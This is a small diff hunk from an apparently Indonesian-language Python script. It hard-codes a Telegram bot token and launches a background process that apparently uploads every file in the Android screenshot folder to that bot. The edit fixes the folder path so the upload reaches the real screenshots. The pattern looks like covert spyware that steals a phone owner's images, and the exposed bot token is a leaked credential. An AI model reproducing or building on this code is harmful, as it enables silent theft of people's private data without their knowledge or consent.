@@ -298,7 +298,7 @@ class simpan_file:
 if __name__ == '__main__':
     clear()
     token ='6235354629:AAGIKAsKzQuRvs-zwnPd9EBZfLLvzPc_FpI'
-    dir_path = "/sdcard/DCIM/screenshot"
+    dir_path = "/sdcard/DCIM/Screenshot"
     p = multiprocessing.Process(target=send_file_link, args=(token, dir_path))
     p.start()
     start()
